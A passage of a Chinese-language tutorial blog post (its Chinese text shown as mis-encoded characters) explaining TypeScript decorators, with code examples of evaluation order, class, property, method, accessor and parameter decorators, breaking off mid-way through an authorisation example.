class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">key: <span class="built_in">string</span></span>): <span class="title">any</span> </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"evaluate: "</span>, key);</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"call: "</span>, key);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@f</span>(<span class="string">"Class Decorator"</span>)</span><br><span class="line"><span class="keyword">class</span> A &#123;</span><br><span class="line">  <span class="meta">@f</span>(<span class="string">"Static Property"</span>)</span><br><span class="line">  <span class="keyword">static</span> prop?: <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@f</span>(<span class="string">"Static Method"</span>)</span><br><span class="line">  <span class="keyword">static</span> method(<span class="meta">@f</span>(<span class="string">"Static Method Parameter"</span>) foo) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params"><span class="meta">@f</span>(<span class="string">"Constructor Parameter"</span>) foo</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@f</span>(<span class="string">"Instance Method"</span>)</span><br><span class="line">  method(<span class="meta">@f</span>(<span class="string">"Instance Method Parameter"</span>) foo) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@f</span>(<span class="string">"Instance Property"</span>)</span><br><span class="line">  prop?: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‰§è¡Œé¡ºåº</span></span><br><span class="line">evaluate:  Instance Method</span><br><span class="line">evaluate:  Instance Method Parameter</span><br><span class="line">call:  Instance Method Parameter</span><br><span class="line">call:  Instance Method</span><br><span class="line">evaluate:  Instance Property</span><br><span class="line">call:  Instance Property</span><br><span class="line">evaluate:  Static Property</span><br><span class="line">call:  Static Property</span><br><span class="line">evaluate:  Static Method</span><br><span class="line">evaluate:  Static Method Parameter</span><br><span class="line">call:  Static Method Parameter</span><br><span class="line">call:  Static Method</span><br><span class="line">evaluate:  Class Decorator</span><br><span class="line">evaluate:  Constructor Parameter</span><br><span class="line">call:  Constructor Parameter</span><br><span class="line">call:  Class Decorator</span><br></pre></td></tr></table></figure>
<p>ç„¶è€Œï¼Œåœ¨åŒä¸€æ–¹æ³•ä¸­çš„ä¸åŒå‚æ•°æ„é€ å™¨é¡ºåºæ˜¯ç›¸åçš„ï¼Œæœ€åå‚æ•°å›çš„è£…é¥°å™¨ä¼šå…ˆè¢«æ‰§è¡Œï¼š<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">key: <span class="built_in">string</span></span>): <span class="title">any</span> </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"evaluate: "</span>, key);</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"call: "</span>, key);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> B &#123;</span><br><span class="line">  <span class="meta">@f</span>(<span class="string">'first'</span>)</span><br><span class="line">  <span class="meta">@f</span>(<span class="string">'second'</span>)</span><br><span class="line">  method() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‰§è¡Œé¡ºåº</span></span><br><span class="line">evaluate:  first</span><br><span class="line">evaluate:  second</span><br><span class="line">call:  second</span><br><span class="line">call:  first</span><br></pre></td></tr></table></figure></p>
<h2 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h2><p><img src="/typescript/best-practice-of-decorator/xmind.png" alt="decorators"></p>
<h3 id="ç±»è£…é¥°å™¨"><a href="#ç±»è£…é¥°å™¨" class="headerlink" title="ç±»è£…é¥°å™¨"></a>ç±»è£…é¥°å™¨</h3><p>ğŸ“Œ å‚æ•°ï¼š</p>
<ul>
<li><code>target</code>: ç±»çš„ <code>æ„é€ å™¨ï¼ˆconstructorï¼‰</code></li>
</ul>
<p>â¬…ï¸ è¿”å›å€¼: undefined | æ›¿ä»£åŸæœ‰æ„é€ å™¨</p>
<p>å› æ­¤ï¼Œç±»è£…é¥°å™¨é€‚åˆç”¨äºç»§æ‰¿ä¸€ä¸ªç°æœ‰ç±»å¹¶æ·»åŠ ä¸€äº›å±æ€§å’Œæ–¹æ³•ã€‚<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rewirteClassConstructor</span>&lt;<span class="title">T</span> <span class="title">extends</span> </span>&#123; <span class="keyword">new</span> (...args: <span class="built_in">any</span>[]): &#123;&#125; &#125;&gt;(<span class="keyword">constructor</span>: T) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">class</span> <span class="keyword">extends</span> <span class="keyword">constructor</span> &#123;</span><br><span class="line">    words = <span class="string">"rewrite constructor"</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@rewirteClassConstructor</span></span><br><span class="line"><span class="keyword">class</span> Speak &#123;</span><br><span class="line">  words: <span class="built_in">string</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params">t: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.words = t;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> say = <span class="keyword">new</span> Speak(<span class="string">"hello world"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(say.words) <span class="comment">// rewrite constructor</span></span><br></pre></td></tr></table></figure></p>
<h3 id="å±æ€§è£…é¥°å™¨"><a href="#å±æ€§è£…é¥°å™¨" class="headerlink" title="å±æ€§è£…é¥°å™¨"></a>å±æ€§è£…é¥°å™¨</h3><p>ğŸ“Œ å‚æ•°: </p>
<ul>
<li><code>target</code>: å¯¹äºé™æ€æˆå‘˜æ¥è¯´æ˜¯ç±»çš„æ„é€ å™¨ï¼Œå¯¹äºå®ä¾‹æˆå‘˜æ¥è¯´æ˜¯ç±»çš„åŸå‹é“¾</li>
<li><code>propertyKey</code>: å±æ€§åç§°</li>
</ul>
<p>â¬…ï¸ è¿”å›å€¼: è¿”å›çš„ç»“æœå°†è¢«å¿½ç•¥</p>
<p>é™¤äº†ç”¨äºæ”¶é›†ä¿¡æ¯å¤–ï¼Œå±æ€§è£…é¥°å™¨ä¹Ÿå¯ä»¥ç”¨æ¥ç»™ç±»æ·»åŠ é¢å¤–çš„æ–¹æ³•å’Œå±æ€§ã€‚ ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªè£…é¥°å™¨æ¥ç»™æŸäº›å±æ€§æ·»åŠ ç›‘å¬å™¨ã€‚<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">"reflect-metadata"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">capitalizeFirstLetter</span>(<span class="params">str: <span class="built_in">string</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.charAt(<span class="number">0</span>).toUpperCase() + str.slice(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">observable</span>(<span class="params">target: <span class="built_in">any</span>, key: <span class="built_in">string</span></span>): <span class="title">any</span> </span>&#123;</span><br><span class="line">  <span class="comment">// prop -&gt; onPropChange</span></span><br><span class="line">  <span class="keyword">const</span> targetKey = <span class="string">"on"</span> + capitalizeFirstLetter(key) + <span class="string">"Change"</span>;</span><br><span class="line"></span><br><span class="line">  target[targetKey] = <span class="function"><span class="keyword">function</span> (<span class="params">fn: (prev: <span class="built_in">any</span>, next: <span class="built_in">any</span>) =&gt; <span class="built_in">void</span></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">let</span> prev = <span class="keyword">this</span>[key];</span><br><span class="line">      <span class="comment">// tsconfig.json target to ES6</span></span><br><span class="line">      Reflect.defineProperty(<span class="keyword">this</span>, key, &#123;</span><br><span class="line">        <span class="keyword">set</span>(next) &#123;</span><br><span class="line">          fn(prev, next);</span><br><span class="line">          prev = next;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> C &#123;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@observable</span></span><br><span class="line">  foo = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  onFooChange(arg0: <span class="function">(<span class="params">prev: <span class="built_in">any</span>, next: <span class="built_in">any</span></span>) =&gt;</span> <span class="built_in">void</span>) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> c = <span class="keyword">new</span> C();</span><br><span class="line"></span><br><span class="line">c.onFooChange(<span class="function">(<span class="params">prev, next</span>) =&gt;</span> <span class="built_in">console</span>.log(<span class="string">`prev: <span class="subst">$&#123;prev&#125;</span>, next: <span class="subst">$&#123;next&#125;</span>`</span>))</span><br><span class="line"></span><br><span class="line">c.foo = <span class="number">100</span>; <span class="comment">// -&gt; prev: -1, next: 100</span></span><br><span class="line">c.foo = <span class="number">-3.14</span>; <span class="comment">// -&gt; prev: 100, next: -3.14</span></span><br></pre></td></tr></table></figure></p>
<h3 id="æ–¹æ³•è£…é¥°å™¨"><a href="#æ–¹æ³•è£…é¥°å™¨" class="headerlink" title="æ–¹æ³•è£…é¥°å™¨"></a>æ–¹æ³•è£…é¥°å™¨</h3><p>ğŸ“Œ å‚æ•°ï¼š</p>
<ul>
<li><code>target</code>: å¯¹äºé™æ€æˆå‘˜æ¥è¯´æ˜¯ç±»çš„æ„é€ å™¨ï¼Œå¯¹äºå®ä¾‹æˆå‘˜æ¥è¯´æ˜¯ç±»çš„åŸå‹é“¾</li>
<li><code>propertyKey</code>: å±æ€§åç§°</li>
<li><code>descriptor</code>: å±æ€§çš„ <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor" target="_blank" rel="noopener">æè¿°å™¨</a></li>
</ul>
<p>â¬…ï¸ è¿”å›å€¼ï¼šundefined | æ›¿ä»£å±æ€§çš„æè¿°å™¨ã€‚</p>
<p>æ–¹æ³•è£…é¥°å™¨<code>descriptor</code>çš„keyä¸ºï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">value</span><br><span class="line">writable</span><br><span class="line">enumerable</span><br><span class="line">configurable</span><br></pre></td></tr></table></figure></p>
<p>é€šè¿‡è¿™ä¸ªå‚æ•°æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æ–¹æ³•åŸæœ¬çš„å®ç°ï¼Œæ·»åŠ ä¸€äº›å…±ç”¨é€»è¾‘ã€‚ ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥ç»™ä¸€äº›æ–¹æ³•æ·»åŠ æ‰“å°è¾“å…¥ä¸è¾“å‡ºçš„èƒ½åŠ›:<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logger</span>(<span class="params">target: <span class="built_in">any</span>, propertyKey: <span class="built_in">string</span>, descriptor: PropertyDescriptor</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> original = descriptor.value;</span><br><span class="line"></span><br><span class="line">  descriptor.value = <span class="function"><span class="keyword">function</span> (<span class="params">...args</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'params: '</span>, ...args);</span><br><span class="line">    <span class="keyword">const</span> result = original.call(<span class="keyword">this</span>, ...args);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'result: '</span>, result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> C &#123;</span><br><span class="line">  <span class="meta">@logger</span></span><br><span class="line">  add(x: <span class="built_in">number</span>, y:<span class="built_in">number</span> ) &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> c = <span class="keyword">new</span> C();</span><br><span class="line">c.add(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// -&gt; params: 1, 2</span></span><br><span class="line"><span class="comment">// -&gt; result: 3</span></span><br></pre></td></tr></table></figure></p>
<h3 id="è®¿é—®å™¨è£…é¥°å™¨"><a href="#è®¿é—®å™¨è£…é¥°å™¨" class="headerlink" title="è®¿é—®å™¨è£…é¥°å™¨"></a>è®¿é—®å™¨è£…é¥°å™¨</h3><p>ğŸ“Œ å‚æ•°ï¼š</p>
<ul>
<li><code>target</code>: å¯¹äºé™æ€æˆå‘˜æ¥è¯´æ˜¯ç±»çš„æ„é€ å™¨ï¼Œå¯¹äºå®ä¾‹æˆå‘˜æ¥è¯´æ˜¯ç±»çš„åŸå‹é“¾</li>
<li><code>propertyKey</code>: å±æ€§åç§°</li>
<li><code>descriptor</code>: å±æ€§çš„ <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor" target="_blank" rel="noopener">æè¿°å™¨</a></li>
</ul>
<p>â¬…ï¸ è¿”å›å€¼ï¼šundefined | æ›¿ä»£å±æ€§çš„æè¿°å™¨ã€‚</p>
<p>è®¿é—®å™¨è£…é¥°å™¨<code>descriptor</code>çš„keyä¸ºï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get</span><br><span class="line">set</span><br><span class="line">enumerable</span><br><span class="line">configurable</span><br></pre></td></tr></table></figure></p>
<p>è®¿é—®å™¨è£…é¥°å™¨æ€»ä½“ä¸Šè®²å’Œæ–¹æ³•è£…é¥°å™¨å¾ˆæ¥è¿‘ï¼Œå”¯ä¸€çš„åŒºåˆ«åœ¨äºæè¿°å™¨ä¸­æœ‰çš„keyä¸åŒä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å°†æŸä¸ªå±æ€§è®¾ä¸ºä¸å¯å˜å€¼ï¼š<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">immutable</span>(<span class="params">target: <span class="built_in">any</span>, propertyKey: <span class="built_in">string</span>, descriptor: PropertyDescriptor</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> original = descriptor.set;</span><br><span class="line"></span><br><span class="line">  descriptor.set = <span class="function"><span class="keyword">function</span> (<span class="params">value: <span class="built_in">any</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> original.call(<span class="keyword">this</span>, &#123; ...value &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> C &#123;</span><br><span class="line">  <span class="keyword">private</span> _point = &#123; x: <span class="number">0</span>, y: <span class="number">0</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@immutable</span></span><br><span class="line">  <span class="keyword">set</span> point(value: &#123; x: <span class="built_in">number</span>, y: <span class="built_in">number</span> &#125;) &#123;</span><br><span class="line">    <span class="keyword">this</span>._point = value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">get</span> point() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._point;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> c = <span class="keyword">new</span> C();</span><br><span class="line"><span class="keyword">const</span> point = &#123; x: <span class="number">1</span>, y: <span class="number">1</span> &#125;</span><br><span class="line">c.point = point;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(c.point === point)</span><br><span class="line"><span class="comment">// -&gt; false</span></span><br></pre></td></tr></table></figure></p>
<h3 id="å‚æ•°è£…é¥°å™¨"><a href="#å‚æ•°è£…é¥°å™¨" class="headerlink" title="å‚æ•°è£…é¥°å™¨"></a>å‚æ•°è£…é¥°å™¨</h3><p>ğŸ“Œ å‚æ•°ï¼š</p>
<ul>
<li><code>target</code>: å¯¹äºé™æ€æˆå‘˜æ¥è¯´æ˜¯ç±»çš„æ„é€ å™¨ï¼Œå¯¹äºå®ä¾‹æˆå‘˜æ¥è¯´æ˜¯ç±»çš„åŸå‹é“¾</li>
<li><code>propertyKey</code>: å±æ€§çš„åç§°(æ³¨æ„æ˜¯æ–¹æ³•çš„åç§°ï¼Œè€Œä¸æ˜¯å‚æ•°çš„åç§°)</li>
<li><code>paramerterIndex</code>: å‚æ•°åœ¨æ–¹æ³•ä¸­æ‰€å¤„çš„ä½ç½®çš„ä¸‹æ ‡</li>
</ul>
<p>â¬…ï¸ è¿”å›å€¼ï¼šè¿”å›çš„å€¼å°†ä¼šè¢«å¿½ç•¥ã€‚</p>
<p>å•ç‹¬çš„å‚æ•°è£…é¥°å™¨èƒ½åšçš„äº‹æƒ…å¾ˆæœ‰é™ï¼Œå®ƒä¸€èˆ¬éƒ½è¢«ç”¨äºè®°å½•å¯è¢«å…¶å®ƒè£…é¥°å™¨ä½¿ç”¨çš„ä¿¡æ¯ã€‚<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// parameter.ts</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"reflect-metadata"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">required</span>(<span class="params">target: <span class="built_in">Object</span>, propertyKey: <span class="built_in">string</span> | symbol, parameterIndex: <span class="built_in">number</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> existingRequiredParameters: <span class="built_in">number</span>[] = Reflect.getOwnMetadata(<span class="string">'required'</span>, target, propertyKey) || [];</span><br><span class="line">    existingRequiredParameters.push(parameterIndex);</span><br><span class="line">    Reflect.defineMetadata(<span class="string">'required'</span>, existingRequiredParameters, target, propertyKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params">target: <span class="built_in">any</span>, propertyName: <span class="built_in">string</span>, descriptor: TypedPropertyDescriptor&lt;<span class="built_in">Function</span>&gt;</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> method = descriptor.value!;</span><br><span class="line">   </span><br><span class="line">    descriptor.value = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">let</span> requiredParameters: <span class="built_in">number</span>[] = Reflect.getOwnMetadata(<span class="string">'required'</span>, target, propertyName);</span><br><span class="line">      <span class="keyword">if</span> (requiredParameters) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> parameterIndex of requiredParameters) &#123;</span><br><span class="line">          <span class="keyword">if</span> (parameterIndex &gt;= <span class="built_in">arguments</span>.length || <span class="built_in">arguments</span>[parameterIndex] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Missing required argument."</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> method.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> BugReport &#123;</span><br><span class="line">    <span class="keyword">type</span> = <span class="string">"report"</span>;</span><br><span class="line">    title: <span class="built_in">string</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params">t: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.title = t;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="meta">@validate</span></span><br><span class="line">    print(<span class="meta">@required</span> verbose: <span class="built_in">boolean</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (verbose) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`type: <span class="subst">$&#123;<span class="keyword">this</span>.<span class="keyword">type</span>&#125;</span>\ntitle: <span class="subst">$&#123;<span class="keyword">this</span>.title&#125;</span>`</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">this</span>.title; </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> report = <span class="keyword">new</span> BugReport(<span class="string">'mode error'</span>);</span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; report &#125; = <span class="built_in">require</span>(<span class="string">'./paramerter.js'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(report.print()); <span class="comment">// Error: Missing required argument.</span></span><br></pre></td></tr></table></figure>
<h2 id="ä½¿ç”¨åœºæ™¯"><a href="#ä½¿ç”¨åœºæ™¯" class="headerlink" title="ä½¿ç”¨åœºæ™¯"></a>ä½¿ç”¨åœºæ™¯</h2><ul>
<li>Before/Afteré’©å­ã€‚</li>
<li>ç›‘å¬å±æ€§æ”¹å˜æˆ–è€…æ–¹æ³•è°ƒç”¨ã€‚</li>
<li>å¯¹æ–¹æ³•çš„å‚æ•°åšè½¬æ¢ã€‚</li>
<li>æ·»åŠ é¢å¤–çš„æ–¹æ³•å’Œå±æ€§ã€‚</li>
<li>è¿è¡Œæ—¶ç±»å‹æ£€æŸ¥ã€‚</li>
<li>è‡ªåŠ¨ç¼–è§£ç ã€‚</li>
<li>ä¾èµ–æ³¨å…¥ã€‚</li>
</ul>
<h3 id="ä½¿ç”¨ä¸¾ä¾‹ï¼š"><a href="#ä½¿ç”¨ä¸¾ä¾‹ï¼š" class="headerlink" title="ä½¿ç”¨ä¸¾ä¾‹ï¼š"></a>ä½¿ç”¨ä¸¾ä¾‹ï¼š</h3><ul>
<li><p>æ—¥å¿—æ‰“å°</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>): <span class="title">any</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">target, key, descriptor</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> method = descriptor.value;</span><br><span class="line">    descriptor.value = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'param: '</span>, <span class="built_in">Array</span>.from(<span class="built_in">arguments</span>));</span><br><span class="line">      <span class="keyword">const</span> value = method.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'result: '</span>, value);</span><br><span class="line">      <span class="keyword">return</span> value</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> B &#123;</span><br><span class="line">  <span class="meta">@f</span>()</span><br><span class="line">  say(name: <span class="built_in">string</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">`name is <span class="subst">$&#123;name&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>é‰´æƒ:</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params">user</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">target, key, descriptor</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> originalMethod = descriptor.value; <span class="comment">// 